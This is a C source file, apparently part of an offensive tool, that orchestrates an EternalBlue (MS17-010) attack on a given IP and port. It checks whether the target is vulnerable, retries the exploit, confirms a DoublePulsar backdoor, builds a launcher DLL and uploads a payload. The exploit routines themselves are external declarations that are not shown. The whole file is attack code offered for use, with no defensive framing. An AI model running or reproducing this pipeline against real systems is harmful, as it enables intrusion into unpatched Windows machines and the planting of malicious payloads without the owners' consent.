#define _GNU_SOURCE
#include "config.h"
#include <stdio.h>

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *target_binary, const char *payload_dll_path);
extern int upload_payload(const char *ip, int port, const char *payload_dll_path, int option);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int attempt;
    int result;

    (void)payload_path;

    printf("Step 1: Checking MS17 vulnerability status\n");
    if (ms17_vuln_status(ip, port) <= 0) {
        printf("Step 1 failed: target is not vulnerable\n");
        return -1;
    }

    printf("Step 2: Attempting EternalBlue\n");
    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        result = EternalBlue(ip, port);
        if (result >= 0)
            break;
        printf("EternalBlue attempt %d failed\n", attempt + 1);
    }
    if (attempt == MAX_RETRIES) {
        printf("Step 2 failed: all EternalBlue attempts failed\n");
        return -2;
    }

    printf("Step 3: Checking DoublePulsar status\n");
    if (doublepulsar_check(ip, port) <= 0) {
        printf("Step 3 failed: DoublePulsar is not active\n");
        return -3;
    }

    printf("Step 4: Building launcher DLL\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) < 0) {
        printf("Step 4 failed: could not build launcher DLL\n");
        return -4;
    }

    printf("Step 5: Uploading payload\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) < 0) {
        printf("Step 5 failed: could not upload payload\n");
        return -5;
    }

    printf("EternalBlue pipeline completed successfully\n");
    return 0;
}